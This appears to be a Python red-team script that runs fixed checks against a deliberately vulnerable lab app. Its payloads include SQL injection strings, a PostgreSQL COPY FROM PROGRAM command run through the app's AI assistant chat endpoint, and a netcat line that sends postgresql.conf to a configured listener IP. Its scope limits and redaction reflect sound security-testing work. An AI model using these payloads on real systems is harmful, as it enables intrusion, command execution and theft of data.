#!/usr/bin/env python3
"""Bounded red-team checks for the Vulnerable-AI-KB training application.

This tool is intentionally narrow: it sends a fixed set of HTTP requests to one
configured application, records the observed behavior, and does not attempt
discovery, brute force, persistence, or destructive database operations.
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any


DEFAULT_EGRESS_PORT = 9000
DEFAULT_TIMEOUT = 10.0
MAX_RESPONSE_BYTES = 1_048_576
PREVIEW_LIMIT = 2_000

SQLI_BOOLEAN_PAYLOAD = "' OR '1'='1' --"
SQLI_UNION_PAYLOAD = (
    "' UNION SELECT id, name, email_address "
    "FROM client_sensitive_data --"
)
ASSISTANT_COMMAND_OUTPUT_SQL = (
    "CREATE TEMP TABLE command_output(content text); "
    "COPY command_output FROM PROGRAM 'ls /var/lib/postgresql/data'; "
    "SELECT * FROM command_output;"
)

EMAIL_RE = re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")
CARD_RE = re.compile(r"(?<!\d)(?:\d[ -]?){13,19}(?!\d)")
SSN_RE = re.compile(r"(?<!\d)\d{3}[- ]\d{3}[- ]\d{3}(?!\d)")
BEARER_RE = re.compile(r"(Bearer\s+)[^\s\"']+", re.IGNORECASE)


@dataclass
class Exchange:
    method: str
    path: str
    status_code: int | None
    elapsed_ms: float
    response: Any = None
    response_preview: str = ""
    error: str | None = None


@dataclass
class Check:
    check_id: str
    title: str
    category: str
    severity: str
    status: str
    expected: str
    observed: str
    exchange_indexes: list[int] = field(default_factory=list)


class TargetError(ValueError):
    """Raised when the target URL is malformed or outside the default scope."""


class HttpClient:
    def __init__(self, target: str, timeout: float) -> None:
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.exchanges: list[Exchange] = []

    def request(
        self,
        method: str,
        path: str,
        *,
        query: dict[str, str] | None = None,
        body: dict[str, Any] | None = None,
    ) -> tuple[int | None, Any, int]:
        url = f"{self.target}{path}"
        if query:
            url += "?" + urllib.parse.urlencode(query)

        encoded_body: bytes | None = None
        headers = {"Accept": "application/json"}
        if body is not None:
            encoded_body = json.dumps(body).encode("utf-8")
            headers["Content-Type"] = "application/json"

        request = urllib.request.Request(
            url,
            data=encoded_body,
            headers=headers,
            method=method,
        )
        started = time.monotonic()
        status_code: int | None = None
        payload: Any = None
        error: str | None = None

        try:
            with urllib.request.urlopen(request, timeout=self.timeout) as response:
                status_code = response.status
                raw = response.read(MAX_RESPONSE_BYTES + 1)
                if len(raw) > MAX_RESPONSE_BYTES:
                    error = f"response exceeded {MAX_RESPONSE_BYTES} bytes"
                    raw = raw[:MAX_RESPONSE_BYTES]
                payload = decode_payload(raw)
        except urllib.error.HTTPError as exc:
            status_code = exc.code
            raw = exc.read(MAX_RESPONSE_BYTES + 1)
            payload = decode_payload(raw[:MAX_RESPONSE_BYTES])
            error = f"HTTP {exc.code}"
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            error = str(exc)
        except Exception as exc:  # noqa: BLE001 - preserve a report for unexpected client errors.
            error = f"{type(exc).__name__}: {exc}"

        elapsed_ms = round((time.monotonic() - started) * 1000, 1)
        preview = sanitized_preview(payload)
        exchange = Exchange(
            method=method,
            path=url_without_target(url),
            status_code=status_code,
            elapsed_ms=elapsed_ms,
            response=payload,
            response_preview=preview,
            error=error,
        )
        self.exchanges.append(exchange)
        return status_code, payload, len(self.exchanges) - 1


def decode_payload(raw: bytes) -> Any:
    text = raw.decode("utf-8", errors="replace")
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        return text


def url_without_target(url: str) -> str:
    url_parts = urllib.parse.urlsplit(url)
    path = url_parts.path or "/"
    return path + (f"?{url_parts.query}" if url_parts.query else "")


def sanitized_preview(value: Any) -> str:
    """Create useful evidence without printing synthetic PII or credentials."""

    def redact(obj: Any, key: str = "") -> Any:
        lower_key = key.lower()
        sensitive_key = any(
            marker in lower_key
            for marker in (
                "email",
                "social_insurance",
                "credit_card",
                "password",
                "secret",
                "token",
                "authorization",
            )
        )
        if sensitive_key and obj not in (None, ""):
            return "[REDACTED]"
        if isinstance(obj, dict):
            return {str(k): redact(v, str(k)) for k, v in obj.items()}
        if isinstance(obj, list):
            return [redact(item, key) for item in obj]
        if isinstance(obj, str):
            value = EMAIL_RE.sub("[REDACTED_EMAIL]", obj)
            value = SSN_RE.sub("[REDACTED_SSN]", value)
            value = CARD_RE.sub("[REDACTED_CARD]", value)
            value = BEARER_RE.sub(r"\1[REDACTED]", value)
            return value
        return obj

    redacted = redact(value)
    text = json.dumps(redacted, ensure_ascii=True) if not isinstance(redacted, str) else redacted
    if len(text) > PREVIEW_LIMIT:
        return text[:PREVIEW_LIMIT] + "…"
    return text


def validate_target(target: str, allow_nonlocal: bool) -> str:
    parsed = urllib.parse.urlsplit(target)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        raise TargetError("target must be an absolute http:// or https:// URL")
    if parsed.username or parsed.password:
        raise TargetError("target must not contain URL credentials")

    hostname = parsed.hostname or ""
    local = hostname.lower() in {"localhost", "ip6-localhost"}
    try:
        local = local or ipaddress.ip_address(hostname).is_loopback
    except ValueError:
        pass
    if not local and not allow_nonlocal:
        raise TargetError(
            "target is not loopback; use --allow-nonlocal only for an explicitly authorized lab target"
        )
    return target.rstrip("/")


def validate_egress_ip(egress_ip: str) -> str:
    try:
        ipaddress.ip_address(egress_ip)
    except ValueError as exc:
        raise TargetError(f"egress destination must be a valid IP address: {egress_ip}") from exc
    return egress_ip


def build_assistant_egress_sql(egress_ip: str, egress_port: int = DEFAULT_EGRESS_PORT) -> str:
    """Build the configured lab egress test after validating the IP as numeric."""

    validate_egress_ip(egress_ip)
    return (
        "CREATE TEMP TABLE command_output(content text); "
        "COPY command_output FROM PROGRAM "
        f"'nc {egress_ip} {egress_port} < postgresql.conf 2>&1 || true'; "
        "SELECT * FROM command_output;"
    )


def start_ncat_listener(port: int = DEFAULT_EGRESS_PORT) -> subprocess.Popen[bytes]:
    """Start a one-connection ncat listener for the configured egress test."""

    listener = subprocess.Popen(
        ["ncat", "-l", str(port)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    # Give ncat a moment to bind so a port conflict is reported before the
    # assistant request is sent.
    time.sleep(0.1)
    if listener.poll() is not None:
        _stdout, stderr = listener.communicate()
        details = stderr.decode("utf-8", errors="replace").strip()
        raise RuntimeError(details or f"ncat exited with status {listener.returncode}")
    return listener


def stop_ncat_listener(listener: subprocess.Popen[bytes], timeout: float = 5.0) -> tuple[bytes, bytes]:
    """Collect one ncat connection and terminate the listener if it remains open."""

    try:
        return listener.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        listener.terminate()
        try:
            return listener.communicate(timeout=1.0)
        except subprocess.TimeoutExpired:
            listener.kill()
            return listener.communicate()


def response_clients(payload: Any) -> list[dict[str, Any]]:
    if not isinstance(payload, dict) or not isinstance(payload.get("clients"), list):
        return []
    return [item for item in payload["clients"] if isinstance(item, dict)]


def names(clients: list[dict[str, Any]]) -> set[str]:
    return {str(item.get("name")) for item in clients if item.get("name") is not None}


def has_sensitive_indicator(clients: list[dict[str, Any]]) -> bool:
    for item in clients:
        for value in item.values():
            if isinstance(value, str) and (EMAIL_RE.search(value) or SSN_RE.search(value)):
                return True
    return False


def assistant_answer(payload: Any) -> str:
    if not isinstance(payload, dict):
        return ""
    return str(payload.get("answer") or "")


def add_check(
    checks: list[Check],
    check_id: str,
    title: str,
    category: str,
    severity: str,
    status: str,
    expected: str,
    observed: str,
    exchange_index: int | None,
) -> None:
    checks.append(
        Check(
            check_id=check_id,
            title=title,
            category=category,
            severity=severity,
            status=status,
            expected=expected,
            observed=observed,
            exchange_indexes=[] if exchange_index is None else [exchange_index],
        )
    )


def run_checks(
    client: HttpClient,
    include_assistant_sql: bool,
    egress_ip: str,
) -> list[Check]:
    checks: list[Check] = []

    status, payload, index = client.request("GET", "/healthz")
    healthy = status == 200 and isinstance(payload, dict) and payload.get("status") == "ok"
    add_check(
        checks,
        "healthz",
        "Application health endpoint",
        "availability",
        "info",
        "passed" if healthy else "failed",
        "HTTP 200 with {\"status\":\"ok\"}",
        f"HTTP {status}; {sanitized_preview(payload)}",
        index,
    )

    status, payload, index = client.request("GET", "/readyz")
    ready = status == 200 and isinstance(payload, dict) and payload.get("status") == "ready"
    readiness_status = "passed" if ready else "failed"
    if status == 503:
        readiness_status = "blocked"
    add_check(
        checks,
        "readyz",
        "Database readiness endpoint",
        "availability",
        "info",
        readiness_status,
        "HTTP 200 with {\"status\":\"ready\"}",
        f"HTTP {status}; {sanitized_preview(payload)}",
        index,
    )

    status, payload, index = client.request("GET", "/api/me/records", query={"q": "Alice"})
    baseline_clients = response_clients(payload)
    baseline_ok = status == 200 and names(baseline_clients) == {"Alice Morgan"}
    add_check(
        checks,
        "baseline-personal-record",
        "Baseline personal-record lookup",
        "functional",
        "info",
        "passed" if baseline_ok else "failed",
        "Alice lookup returns only Alice Morgan",
        f"HTTP {status}; {len(baseline_clients)} client row(s); names={sorted(names(baseline_clients))}",
        index,
    )

    status, payload, index = client.request(
        "GET",
        "/api/me/records",
        query={"q": SQLI_BOOLEAN_PAYLOAD},
    )
    injected_clients = response_clients(payload)
    bypass_confirmed = status == 200 and len(injected_clients) > 1
    add_check(
        checks,
        "sqli-personal-records",
        "SQL injection bypasses personal-record scope",
        "injection",
        "high",
        "confirmed" if bypass_confirmed else "not_observed",
        "A boolean SQL payload must not return records beyond Alice Morgan",
        f"HTTP {status}; {len(injected_clients)} client row(s); names={sorted(names(injected_clients))}",
        index,
    )

    status, payload, index = client.request(
        "GET",
        "/api/clients",
        query={"q": SQLI_BOOLEAN_PAYLOAD},
    )
    all_clients = response_clients(payload)
    lookup_injection = status == 200 and len(all_clients) > 1
    add_check(
        checks,
        "sqli-client-search",
        "SQL injection expands client search results",
        "injection",
        "high",
        "confirmed" if lookup_injection else "not_observed",
        "A boolean SQL payload must not expand a single search term to multiple records",
        f"HTTP {status}; {len(all_clients)} client row(s); names={sorted(names(all_clients))}",
        index,
    )

    status, payload, index = client.request(
        "GET",
        "/api/clients",
        query={"q": SQLI_UNION_PAYLOAD},
    )
    union_clients = response_clients(payload)
    union_confirmed = status == 200 and has_sensitive_indicator(union_clients)
    add_check(
        checks,
        "sqli-union-sensitive-data",
        "SQL injection exposes sensitive-data values through a UNION",
        "data-exposure",
        "critical",
        "confirmed" if union_confirmed else "not_observed",
        "Search results must not contain values from client_sensitive_data",
        f"HTTP {status}; {len(union_clients)} client row(s); sensitive-value indicator={union_confirmed}",
        index,
    )

    if include_assistant_sql:
        status, payload, index = client.request(
            "POST",
            "/api/assistant/chat",
            body={"question": "SELECT COUNT(*) AS row_count FROM clients"},
        )
        answer = assistant_answer(payload)
        direct_sql_confirmed = status == 200 and "Raw SQL mode" in str(answer)
        add_check(
            checks,
            "assistant-direct-sql",
            "Assistant executes SQL-shaped user input directly",
            "injection",
            "high",
            "confirmed" if direct_sql_confirmed else "not_observed",
            "A direct SQL-shaped question must not be executed as raw SQL",
            f"HTTP {status}; raw SQL marker present={direct_sql_confirmed}",
            index,
        )

        status, payload, index = client.request(
            "POST",
            "/api/assistant/chat",
            body={"question": ASSISTANT_COMMAND_OUTPUT_SQL},
        )
        answer = assistant_answer(payload)
        command_output_confirmed = status == 200 and bool(
            re.search(r"(?:postgresql\.conf|pg_hba\.conf|PG_VERSION|pg_wal)", answer)
        )
        add_check(
            checks,
            "assistant-copy-from-program-list",
            "Assistant can execute COPY FROM PROGRAM for a database-directory listing",
            "command-execution",
            "critical",
            "confirmed" if command_output_confirmed else "not_observed",
            "The assistant must not execute OS commands through PostgreSQL",
            f"HTTP {status}; expected database-directory entry observed={command_output_confirmed}",
            index,
        )

        listener: subprocess.Popen[bytes] | None = None
        try:
            listener = start_ncat_listener()
        except (OSError, RuntimeError) as exc:
            add_check(
                checks,
                "assistant-ncat-egress",
                "Assistant can send database files to the configured ncat listener",
                "data-exfiltration",
                "critical",
                "blocked",
                "Start ncat before executing the assistant egress SQL command",
                f"ncat listener failed to start: {exc}",
                None,
            )
        else:
            status: int | None = None
            payload: Any = None
            index: int | None = None
            received = b""
            listener_stderr = b""
            try:
                status, payload, index = client.request(
                    "POST",
                    "/api/assistant/chat",
                    body={"question": build_assistant_egress_sql(egress_ip)},
                )
            finally:
                received, listener_stderr = stop_ncat_listener(listener)

            answer = assistant_answer(payload)
            egress_confirmed = status == 200 and bool(received)
            stderr_text = listener_stderr.decode("utf-8", errors="replace").strip()
            observed = (
                f"HTTP {status}; listener_received_bytes={len(received)}; "
                f"assistant_raw_sql_marker={'Raw SQL mode' in answer}"
            )
            if stderr_text:
                observed += f"; listener_stderr={sanitized_preview(stderr_text)}"
            add_check(
                checks,
                "assistant-ncat-egress",
                "Assistant can send database files to the configured ncat listener",
                "data-exfiltration",
                "critical",
                "confirmed" if egress_confirmed else "not_observed",
                "The assistant must not be able to execute COPY FROM PROGRAM and send a database file over the network",
                observed,
                index,
            )

    return checks


def build_report(target: str, client: HttpClient, checks: list[Check]) -> dict[str, Any]:
    confirmed = sum(check.status == "confirmed" for check in checks)
    failed = sum(check.status == "failed" for check in checks)
    blocked = sum(check.status == "blocked" for check in checks)
    return {
        "tool": "vulnerable-app-red-teaming",
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "target": target,
        "summary": {
            "checks": len(checks),
            "confirmed_findings": confirmed,
            "failed_checks": failed,
            "blocked_checks": blocked,
        },
        "checks": [asdict(check) for check in checks],
        "exchanges": [
            {
                "method": exchange.method,
                "path": exchange.path,
                "status_code": exchange.status_code,
                "elapsed_ms": exchange.elapsed_ms,
                "response_preview": exchange.response_preview,
                "error": exchange.error,
            }
            for exchange in client.exchanges
        ],
        "notes": [
            "Requests use fixed, non-destructive lab payloads.",
            "Response previews redact values that look like email addresses, IDs, cards, or credentials.",
            "A confirmed result means the vulnerable behavior was observed; it is not a production risk rating.",
        ],
    }


def print_report(report: dict[str, Any]) -> None:
    summary = report["summary"]
    print(f"Target: {report['target']}")
    print(
        "Checks: {checks}; confirmed findings: {confirmed_findings}; "
        "failed: {failed_checks}; blocked: {blocked_checks}".format(**summary)
    )
    print()
    for check in report["checks"]:
        print(f"[{check['status'].upper():13}] {check['check_id']}: {check['title']}")
        print(f"               {check['observed']}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Run bounded red-team checks against the vulnerable training app."
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Base URL of the lab app (required).",
    )
    parser.add_argument(
        "--egress-ip",
        required=True,
        help="Destination IP used by the postgresql.conf egress test (required).",
    )
    parser.add_argument(
        "--allow-nonlocal",
        action="store_true",
        help="Permit a non-loopback target; use only for an authorized lab host.",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=DEFAULT_TIMEOUT,
        help=f"Per-request timeout in seconds (default: {DEFAULT_TIMEOUT})",
    )
    parser.add_argument(
        "--output",
        help="Write the sanitized JSON report to this path.",
    )
    parser.add_argument(
        "--skip-assistant-sql",
        action="store_true",
        help="Skip the assistant's direct-SQL execution check.",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.timeout <= 0:
        print("error: --timeout must be positive", file=sys.stderr)
        return 2
    try:
        target = validate_target(args.target, args.allow_nonlocal)
        egress_ip = validate_egress_ip(args.egress_ip)
    except TargetError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2

    client = HttpClient(target, args.timeout)
    checks = run_checks(
        client,
        include_assistant_sql=not args.skip_assistant_sql,
        egress_ip=egress_ip,
    )
    report = build_report(target, client, checks)
    print_report(report)

    if args.output:
        output_path = Path(args.output)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        with output_path.open("w", encoding="utf-8") as report_file:
            json.dump(report, report_file, indent=2, ensure_ascii=True)
            report_file.write("\n")
        print(f"\nSanitized report written to {args.output}")

    return 1 if report["summary"]["confirmed_findings"] or report["summary"]["failed_checks"] else 0


if __name__ == "__main__":
    raise SystemExit(main())
